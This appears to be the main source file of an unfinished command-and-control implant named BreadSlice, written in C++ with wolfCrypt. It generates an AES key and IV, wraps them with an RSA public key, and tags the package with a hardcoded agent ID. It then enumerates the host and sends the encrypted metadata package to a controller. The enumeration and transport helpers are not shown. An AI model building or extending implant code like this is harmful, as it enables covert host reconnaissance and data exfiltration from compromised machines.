// BreadSlice.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include <wolfcrypt/rsa.h>
#include <wolfcrypt/random.h>
#include "package.h"
#include "agent.h"
#include "Helpers.h"
#include "enum.h"
#include "Http.h"
#include "localcstd.h"


int main()

//TODO finish establishing secure comms.
{
    //read rsa public key in der format from file.
    unsigned char* RsaPublicKeyDerBytes;
    unsigned long RsaPublicKeySize;

    ReadRsaPublicKey(&RsaPublicKeyDerBytes, &RsaPublicKeySize);
    RsaKey rsaPublicKey;
    word32 idx = 0;
    wc_InitRsaKey(&rsaPublicKey, NULL);
    wc_RsaPublicKeyDecode(RsaPublicKeyDerBytes, &idx, &rsaPublicKey, RsaPublicKeySize);

    //generate rng object
    WC_RNG rng;
    wc_InitRng(&rng);

    //generate aeskey and iv
    byte* EncryptedAesKey = (byte*)malloc(sizeof(byte) * 500);
    byte* EncryptedIV = (byte*)malloc(sizeof(byte) * 500);
    byte* AesKey = (byte*)malloc(sizeof(byte) * AES_256_KEY_SIZE);
    byte* AesIV = (byte*)malloc(sizeof(byte) * AES_BLOCK_SIZE);
    MemorySet(EncryptedAesKey, 0, 500);
    MemorySet(EncryptedIV, 0, 500);
    MemorySet(AesKey, 0, AES_256_KEY_SIZE);
    MemorySet(AesIV, 0, AES_BLOCK_SIZE);

    wc_RNG_GenerateBlock(&rng, AesKey, AES_256_KEY_SIZE);
    wc_RNG_GenerateBlock(&rng, AesIV, AES_BLOCKLEN);

    //encrypt aes key
    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, AES_256_KEY_SIZE, EncryptedAesKey, 500, &rsaPublicKey, &rng);
    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 500, &rsaPublicKey, &rng);
    wc_FreeRng(&rng);

   //encrypt iv

    pPackage pPack;
    Agent AgentData = { 0 };
    INT err;

    AgentData.AgentID = 0xdeadbeef;
    AgentData.AESKey = AesKey;
    AgentData.AESKeySize = AES_256_KEY_SIZE;
    AgentData.EncryptedAESKey = EncryptedAesKey;
    AgentData.EncryptedAESKeySize = EncryptedKeySize;
    AgentData.IV = AesIV;
    AgentData.IVSize = AES_BLOCK_SIZE;
    AgentData.EncryptedIV = EncryptedIV;
    AgentData.EncryptedIVSize = EncryptedIvSize;

    
    if ((pPack = CreatePackageWithMetaData(INITIALIZE_AGENT, &AgentData)) == NULL) {
        printf("[error] attempting to create package\n");
        return -1;
    }
    //add package to agentData.
    AgentData.packages = pPack;
    AddPackageToAgentPackageList(&AgentData, pPack);

    //if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS) {
    //    printf("[error] attempting to add aes key length to package\n");
    //    return -1;
    //}
    if ((err = AddBytesToPackage(AgentData.packages, AgentData.EncryptedAESKey, AgentData.EncryptedAESKeySize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }
    //if ((err = AddInt32ToPackage(AgentData.packages, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS) {
    //    printf("[error] attempting to add IV length to package\n");
    //    return -1;
    //}
    if ((err = AddBytesToPackage(AgentData.packages, AgentData.EncryptedIV, AgentData.EncryptedIVSize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }

    Enumerate(&AgentData);

    if ((err = AddStringToPackage(AgentData.packages, "ENCRYPTION TEST!!! THIS IS AN ENCRYPTION TEST!!\nLOLOLOLTEST%%$@(((*@)_#\n123400")) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add the dummy data to encrypted\n");
        return -1;
    }
/*
    printf("Encrypted AES Key: \n{ ");
    for (int i = 0; i < AgentData.EncryptedAESKeySize; i++)
    {
        printf("0x%02X, ", AgentData.EncryptedAESKey[i]);
    }
    printf("}\n");
    printf("Encrypted IV Key: \n{ ");
    for (int i = 0; i < AgentData.EncryptedIVSize; i++)
    {
        printf("0x%02X, ", AgentData.EncryptedIV[i]);
    }
    printf("}\n");
    printf(" AES Key: \n{ ");
    for (int i = 0; i < AgentData.AESKeySize; i++)
    {
        printf("0x%02X, ", AgentData.AESKey[i]);
    }
    printf("}\n");
    printf("IV Key: \n{ ");
    for (int i = 0; i < AgentData.IVSize; i++)
    {
        printf("0x%02X, ", AgentData.IV[i]);
    }
    printf("}\n");
*/
    PackageSendMetaDataPackage(AgentData.packages, NULL, NULL, &AgentData);
}

